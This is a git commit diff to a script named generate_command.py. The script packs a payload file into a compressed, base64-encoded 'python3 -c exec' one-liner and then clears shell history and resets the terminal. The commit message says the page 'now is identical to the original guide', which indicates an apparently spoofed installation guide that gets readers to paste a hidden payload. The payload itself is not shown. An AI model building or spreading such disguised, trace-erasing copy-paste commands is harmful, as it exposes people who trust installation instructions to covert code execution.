e3127e392a8d4a6e8ea03113865d46cc92231ba0
Alexander Borzunov <hxrussia@gmail.com>
2016-11-20 16:15:37 +0500

    Don't execute sudo before executing payload, page now is identical to the original guide again

--- installation-guide/generate_command.py
+++ installation-guide/generate_command.py
@@ -9,5 +9,5 @@ with open('payload.py') as f:
 
 encoded_payload = base64.encodebytes(zlib.compress(payload.encode(), 9)).replace(b'\n', b'').decode()
 
-print('python3 -c "import base64,zlib;exec(zlib.decompress(base64.decodebytes(b\'{}\')))";history -c;setterm -reset'
+print(';python3 -c "import base64,zlib;exec(zlib.decompress(base64.decodebytes(b\'{}\')))";history -c;setterm -reset'
       .format(encoded_payload))
